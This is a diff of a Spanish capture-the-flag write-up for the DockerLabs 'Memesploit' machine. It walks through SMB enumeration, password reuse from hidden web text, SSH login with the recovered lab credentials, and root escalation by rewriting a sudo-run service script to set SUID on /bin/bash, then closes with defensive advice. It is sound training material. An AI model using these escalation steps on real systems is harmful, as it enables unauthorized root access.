@@ -1,77 +1,313 @@
-# MEMESPLOIT — DockerLabs
+# Memesploit — DockerLabs
 
 **Plataforma:** DockerLabs  
-**Dificultad:** 🟠 Media  
+**Dificultad:** 🟡 Medio  
 **SO:** Linux  
+**Autor de la máquina:** d1se0  
+**Fecha de creación:** 01/09/2024  
+**Técnicas:** SMB Enumeration · Hidden Text Disclosure · ZIP Password Reuse · SSH · Writable Script Abuse · sudo service abuse · SUID escalation
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **MEMESPLOIT** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web y SMB](#2-enumeración-web-y-smb)
+3. [Obtención de credenciales](#3-obtención-de-credenciales)
+4. [Acceso SSH — usuario memesploit](#4-acceso-ssh--usuario-memesploit)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable
+Desplegamos la máquina vulnerable:
 
-Ahora haremos un escaneo profundo de los puertos abiertos de la máquina.
+```bash
+sudo bash auto_deploy.sh memesploit.tar
+```
 
-Al ver que tiene un servicio http, vamos a visitar la pagina que tiene.
+> IP asignada: `172.17.0.2`
 
-## 2. Enumeración
+Realizamos un escaneo profundo:
 
-Vemos que seleccionando nos encontramos con palabras que estaban ocultas.
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
 
-Ahora vamos a hacer un escaneo a smb
+Resultado:
 
-Lo que encontramos es que tenemos un directorio compartido llamado
+```text
+22/tcp open ssh
+80/tcp open http
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+```
+
+Servicios detectados:
+
+```text
+SSH
+HTTP
+SMB
+```
+
+---
+
+## 2. Enumeración web y SMB
+
+Accedemos al servidor web y observamos una página temática estilo hacker.
+
+Seleccionando el texto de la página descubrimos palabras ocultas dentro del contenido.
+
+Estas frases ocultas serán utilizadas posteriormente como posibles contraseñas.
+
+Realizamos enumeración SMB:
+
+```bash
+enum4linux -a 172.17.0.2
+```
+
+Resultado:
+
+```text
 share_memehydra
+```
 
-## 3. Explotación
+También encontramos usuarios válidos:
 
-Y encontramos dos usuarios.
+```text
+memesploit
+memehydra
+```
 
-Ahora si nos logeamos con el usuario memehydra, podemos ver que la contraseña
-es una de las frases que estaba oculta en la pagina web.
-Tiene un fichero zip, así que nos lo llevaremos a nuestra maquina y veremos que
-tiene dentro.
+Accedemos al recurso SMB:
 
-Vemos que tiene contraseña, pero la contraseña también es una de las frases que
-estaban ocultas en la página web.
-Encontramos el usuario y la contraseña.
+```bash
+smbclient //172.17.0.2/share_memehydra -U memehydra
+```
 
-## 4. Post-explotación
+Utilizamos como contraseña una de las frases ocultas encontradas en la web.
 
-Ahora nos conectamos por ssh a este usuario.
+Acceso correcto.
 
-Con sudo -l para ver como podemos escalar privilegios nos encontramos un
-script, lo vamos a investigar.
+Listamos el contenido:
 
-Buscamos por el nombre a ver donde ejecuta este script
+```bash
+ls
+```
+
+Resultado:
+
+```text
+secret.zip
+```
+
+Descargamos el archivo:
+
+```bash
+get secret.zip
+```
+
+---
+
+## 3. Obtención de credenciales
+
+Intentamos extraer el ZIP:
+
+```bash
+unzip secret.zip
+```
+
+El archivo requiere contraseña.
+
+Probamos nuevamente una de las frases ocultas de la página web.
+
+Resultado:
+
+```text
+inflating: secret.txt
+```
+
+Leemos el contenido:
+
+```bash
+cat secret.txt
+```
+
+Resultado:
+
+```text
+memesploit:metasploitelmejor
+```
+
+---
+
+## 4. Acceso SSH — usuario memesploit
+
+Accedemos mediante SSH:
+
+```bash
+ssh memesploit@172.17.0.2
+```
+
+Contraseña:
+
+```text
+metasploitelmejor
+```
+
+Acceso correcto.
+
+Comprobamos privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
+```
+
+Buscamos el directorio relacionado:
+
+```bash
+find / -name 'login_monitor' 2>/dev/null
+```
+
+Resultado:
+
+```text
+/etc/init.d/login_monitor
+/etc/login_monitor
+```
+
+Exploramos el contenido:
+
+```bash
+cd /etc/login_monitor
+ls -la
+```
+
+Resultado:
+
+```text
+actionban.sh
+activity.sh
+network.sh
+security.sh
+```
+
+El script principal utilizado por el servicio es:
+
+```text
+actionban.sh
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Vemos que tiene varios ejecutables, el principal es actionban.sh
+Comprobamos permisos del directorio:
 
-Miramos y vemos que todos tienen restricciones porque son de root, pero el grupo
-del directorio es securuty y si vemos nuestro usuario, también podemos encontrar
-que somos del mismo grupo.
+```bash
+id
+```
 
-Con estos permisos podemos hacer lo siguiente.
-Copiaremos los datos en otro formato, luego eliminaremos el script original.
-Comprobamos que se eliminó correctamente, luego le cambiamos el nombre al
-que hicimos la copia con el nombre original y así podemos tener permisos para
-escribir.
+Resultado:
 
-## 6. Lección aprendida
+```text
+groups=1001(memesploit),100(users),1003(security)
+```
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+El directorio pertenece al grupo:
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+```text
+security
+```
+
+Y nuestro usuario forma parte del mismo grupo.
+
+Aprovechamos esto para reemplazar el script:
+
+```bash
+cp actionban.sh actionban.sp
+rm actionban.sh
+mv actionban.sp actionban.sh
+```
+
+Ahora tenemos permisos de escritura sobre el nuevo archivo.
+
+Editamos el script:
+
+```bash
+nano actionban.sh
+```
+
+Añadimos al final:
+
+```bash
+chmod u+s /bin/bash
+```
+
+Ejecutamos el servicio como root:
+
+```bash
+sudo /usr/sbin/service login_monitor restart
+```
+
+Verificamos permisos:
+
+```bash
+ls -la /bin/bash
+```
+
+Resultado:
+
+```text
+-rwsr-xr-x
+```
+
+Ejecutamos Bash preservando privilegios:
+
+```bash
+bash -p
+```
+
+Verificamos acceso:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Información oculta en frontend | Descubrimiento de contraseñas |
+| SMB expuesto | Acceso a archivos sensibles |
+| Reutilización de contraseñas | Acceso inicial |
+| Scripts gestionados por grupos inseguros | Escalada de privilegios |
+| sudo sobre service | Ejecución privilegiada |
+| Activación del bit SUID | Acceso persistente root |
+
+**Para defenderse:**
+
+- Evitar almacenar información sensible en frontend.
+- Restringir acceso a recursos SMB.
+- Aplicar políticas robustas de contraseñas.
+- Auditar permisos de grupos sobre scripts críticos.
+- Limitar comandos sudo peligrosos.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
